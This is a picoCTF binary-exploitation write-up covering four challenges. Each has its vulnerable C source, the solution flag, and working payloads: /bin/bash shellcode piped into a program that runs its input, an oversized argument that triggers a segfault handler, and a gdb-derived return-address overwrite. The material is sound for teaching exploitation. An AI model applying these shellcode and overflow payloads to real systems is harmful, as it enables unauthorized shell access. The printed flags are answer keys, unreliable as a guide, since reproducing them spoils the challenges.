# Binary Exploit

### handy-shellcode (50 points)

This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in `/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5` on the shell server.

FLAG: `picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

Find a shellcode to execute `/bin/bash` online:

```
\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
```

Use python2 to print it and pipe it to the vulnerable program. python3 has a different version of print statement, which removes some "unprintable" characters from the output. That would ruin the shellcode.

**Note:** We can use `cat` to keep the input stream open!

```bash
$ (python -c "print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')" ; cat) | ./vuln
```

We get the following result:

```bash
$ /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5$ (python -c "print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')" ; cat) | ./vuln
Enter your shellcode:
j
 X�Rfh-p��Rjhh/bash/bin��RQS��̀
Thanks! Executing now...
id
uid=29614(sophiasp1r0) gid=8870(handy-shellcode_1) groups=8870(handy-shellcode_1),1002(competitors),29615(sophiasp1r0)
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}exit

```

Same effect can be achieve using the following command:

```bash
$ (echo -n -e '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' ; cat) | ./vuln
```

or use `pwn.asm(pwn.shellcraft.linux.sh())` (See [this link](https://www.youtube.com/watch?v=Nn0fUJuQEsk&t=174s))

### practice-run-1 (50 points)

You're going to need to know how to run programs if you're going to get out of here. Navigate to `/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e` on the shell server and run this program to receive a flag.

FLAG: `picoCTF{g3t_r3adY_2_r3v3r53}`

```bash
$ /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e/run_this
# => picoCTF{g3t_r3adY_2_r3v3r53}
```

### Overflow 0 (100 points)

This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in `/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6` on the shell server.

FLAG: `picoCTF{3asY_P3a5y4a888b8e}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}

```

Overflow the buffer to trigger segmentation fault, and the program will print out the flag.

```bash
$ python -c "print('A' * 140)" | xargs ./vuln
# => picoCTF{3asY_P3a5y4a888b8e}
```

### Overflow 1 (150 points)

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in `/problems/overflow-1_1_e792baa0d29d24699530e6a26071a260` on the shell server.

FLAG: `picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

Using gdb we can figure out that the buffer starts at `0xffffd6c0` and ends at `0xffffd700`. However, `ebp` for `vuln` is `0xffffd708`. That means, there are 8 bytes between the end of the buffer and the start of the saved frame pointer. The return address should be at `0xffffd70c`.

That means, we need to pass in a string of 72 bytes to overwrite the return address and make `vuln` return to `flag`. The address of `flag` is `0x080485e6`.

Therefore, we can use the following command:

```bash
$ ruby -e 'print("A" * 64 + "\x28\x88\x04\x08" + "\x00\xa0\x04\x08" + "\x28\xd7\xff\xff" + "\xe6\x85\x04\x08");' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}Segmentation fault (core dumped)
```
